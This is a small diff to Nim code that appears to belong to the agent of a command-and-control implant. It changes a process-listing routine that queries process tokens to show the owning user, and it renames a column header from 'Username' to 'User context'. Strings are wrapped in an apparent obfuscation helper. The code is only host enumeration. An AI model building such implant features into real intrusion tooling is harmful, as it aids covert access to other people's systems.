@@ -84,6 +84,7 @@ when defined(agent):
                     hProcess: HANDLE
                     user: string
                 
+                # User context
                 hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID)
                 if hProcess != 0: 
                     if OpenProcessToken(hProcess, TOKEN_QUERY, addr hToken): 
@@ -129,7 +130,7 @@ when defined(agent):
                     processes.add(pid)
 
             # Add header row
-            let headers = @[protect("PID"), protect("PPID"), protect("Process"), protect("Username")]
+            let headers = @[protect("PID"), protect("PPID"), protect("Process"), protect("User context")]
             output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<40}{headers[3]}" & "\n"
             output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(40) & "-".repeat(len(headers[3])) & "\n"
 
